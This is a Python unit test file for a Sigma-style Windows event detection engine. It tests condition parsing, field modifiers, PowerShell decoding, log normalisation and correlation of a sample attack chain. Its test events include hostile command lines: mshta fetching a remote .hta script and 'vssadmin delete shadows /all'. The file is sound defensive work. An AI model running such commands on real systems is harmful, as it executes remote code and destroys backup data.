import base64
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from engine.correlate import ProcessTree, build_incidents, detect  # noqa: E402
from engine.enrich import decode_powershell, enrich  # noqa: E402
from engine.events import load_events, normalise  # noqa: E402
from engine.rules import ConditionParser, compile_detection_item, load_rules  # noqa: E402

RULES = load_rules(ROOT / "rules")
SAMPLE = ROOT / "samples" / "attack_chain.jsonl"


def fire(event):
    return {r.title for r in RULES if r.matches(event)}


class ConditionTests(unittest.TestCase):
    names = {"a": lambda e: e["a"], "b": lambda e: e["b"], "sel_x": lambda e: e["x"], "sel_y": lambda e: e["y"]}

    def ev(self, **kw):
        return {"a": False, "b": False, "x": False, "y": False, **kw}

    def test_precedence_and_binds_tighter_than_or(self):
        f = ConditionParser("a or b and not a", self.names).parse()
        self.assertTrue(f(self.ev(a=True)))
        self.assertTrue(f(self.ev(b=True)))

    def test_parentheses(self):
        f = ConditionParser("(a or b) and not sel_x", self.names).parse()
        self.assertTrue(f(self.ev(a=True)))
        self.assertFalse(f(self.ev(a=True, x=True)))

    def test_one_of_and_all_of(self):
        self.assertTrue(ConditionParser("1 of sel_*", self.names).parse()(self.ev(y=True)))
        self.assertFalse(ConditionParser("all of sel_*", self.names).parse()(self.ev(y=True)))

    def test_unknown_name_raises(self):
        with self.assertRaises(ValueError):
            ConditionParser("nope", self.names).parse()


class ModifierTests(unittest.TestCase):
    def test_modifiers(self):
        m = compile_detection_item({"Image|endswith": "\\cmd.exe", "CommandLine|contains|all": ["a", "b"]})
        self.assertTrue(m({"Image": "C:\\WINDOWS\\CMD.EXE", "CommandLine": "x a y b"}))
        self.assertFalse(m({"Image": "C:\\cmd.exe", "CommandLine": "only a"}))

    def test_wildcard_and_missing_field(self):
        m = compile_detection_item({"Image": "*\\rundll32.exe"})
        self.assertTrue(m({"Image": "C:\\Windows\\System32\\rundll32.exe"}))
        self.assertFalse(m({}))


class EnrichmentAndFormatTests(unittest.TestCase):
    def test_decode_encoded_powershell(self):
        enc = base64.b64encode("Write-Host hi".encode("utf-16-le")).decode()
        self.assertEqual(decode_powershell(f"powershell -enc {enc}"), "Write-Host hi")

    def test_normalise_evtx_and_winlogbeat(self):
        evtx = {"Event": {"System": {"EventID": {"#text": "1"}, "Computer": "H1"},
                          "EventData": {"Data": [{"@Name": "Image", "#text": "C:\\x.exe"}]}}}
        beat = {"winlog": {"event_id": "3", "computer_name": "H2", "event_data": {"Image": "y.exe"}}}
        self.assertEqual(normalise(evtx)["EventID"], 1)
        self.assertEqual(normalise(evtx)["Image"], "C:\\x.exe")
        self.assertEqual(normalise(beat)["Computer"], "H2")


class RuleTests(unittest.TestCase):
    def test_filters_suppress_known_benign(self):
        defender = {"EventID": 10, "SourceImage": "C:\\ProgramData\\Microsoft\\Windows Defender\\MsMpEng.exe",
                    "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1410"}
        onedrive = {"EventID": 13, "TargetObject": "HKU\\x\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive",
                    "Details": "C:\\Users\\u\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe"}
        self.assertEqual(fire(defender), set())
        self.assertEqual(fire(onedrive), set())

    def test_mshta_remote_script(self):
        ev = {"EventID": 1, "Image": "C:\\Windows\\System32\\mshta.exe",
              "CommandLine": "mshta.exe https://198.51.100.7/x.hta"}
        self.assertIn("Mshta or Rundll32 Executing Remote or Script Content", fire(ev))

    def test_event_id_scoping(self):
        # Same command line but logged as a file event must not trigger process rules
        self.assertEqual(fire({"EventID": 11, "CommandLine": "vssadmin delete shadows /all"}), set())


class EndToEndTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.events = enrich(load_events(SAMPLE))
        cls.alerts = detect(cls.events, RULES)
        cls.incidents = build_incidents(cls.alerts, ProcessTree(cls.events))

    def test_attack_chain_coverage(self):
        not_in_scenario = {"Mshta or Rundll32 Executing Remote or Script Content"}
        expected = {r.title for r in RULES} - not_in_scenario
        self.assertEqual({a.rule.title for a in self.alerts}, expected)

    def test_no_alerts_on_benign_hosts(self):
        self.assertEqual({a.event["Computer"] for a in self.alerts}, {"WS-FIN-07.corp.local"})

    def test_single_correlated_incident(self):
        self.assertEqual(len(self.incidents), 1)
        inc = self.incidents[0]
        self.assertEqual(inc.severity, "critical")
        self.assertEqual(inc.tactics[0], "initial-access")
        self.assertEqual(inc.tactics[-1], "impact")


if __name__ == "__main__":
    unittest.main()
